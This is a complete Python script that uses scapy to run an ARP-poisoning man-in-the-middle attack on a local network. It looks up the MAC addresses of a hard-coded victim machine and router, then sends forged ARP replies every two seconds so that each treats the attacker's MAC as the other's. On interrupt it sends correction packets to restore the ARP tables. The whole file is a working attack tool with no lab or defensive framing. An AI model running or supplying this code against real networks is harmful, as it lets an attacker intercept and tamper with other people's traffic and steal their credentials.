from scapy.all import *
import time
import signal
import sys

my_mac="10:bf:48:69:fe:44"
router_ip="192.168.0.1"
victim_ip="192.168.0.100"

print("Setup: Fetching Victim and Router Information")
# request the victims IP ?
victiminfo = sr1(ARP(op=ARP.who_has, psrc="192.168.0.180", pdst=victim_ip))
routerinfo = sr1(ARP(op=ARP.who_has, psrc="192.168.0.180", pdst=router_ip))

keep_poisoning = True

def signal_handler(signal, frame):
    print("ARP Poison Terminating...Correcting the Network...")
    global keep_poisoning
    keep_poisoning = False

signal.signal(signal.SIGINT, signal_handler)

print("Setup Complete. Now Poisoning The Network")
while keep_poisoning:

    time.sleep(2)
    # posion to be sent to the victim - says i am the router
    victim_pkt = ARP(op=ARP.is_at, hwsrc=my_mac,psrc=router_ip,hwdst=victiminfo.hwsrc, pdst=victim_ip)
    send(victim_pkt)

    #posion to be sent to the router - says i am the victim
    router_pkt = ARP(op=ARP.is_at, hwsrc=my_mac, psrc=victim_ip, hwdst=routerinfo.hwsrc, pdst=router_ip)
    send(router_pkt)

#we should cleanup now and correct the information
print("Terminated ARP Poisoning. Sleeping For A Second")

time.sleep(1)

print("Sending Correction ARP Packets")

correct_victim_pkt = ARP(op=ARP.is_at, hwsrc=routerinfo.hwsrc, psrc=router_ip, hwdst=victiminfo.hwsrc, pdst=victim_ip)
correct_router_pkt = ARP(op=ARP.is_at, hwsrc=victiminfo.hwsrc, psrc=victim_ip, hwdst=routerinfo.hwsrc, pdst=router_ip)

send(correct_victim_pkt)
send(correct_router_pkt)
time.sleep(1)
send(correct_victim_pkt)
send(correct_router_pkt)

print("Correcitons Complete. ARP Poison Removed")
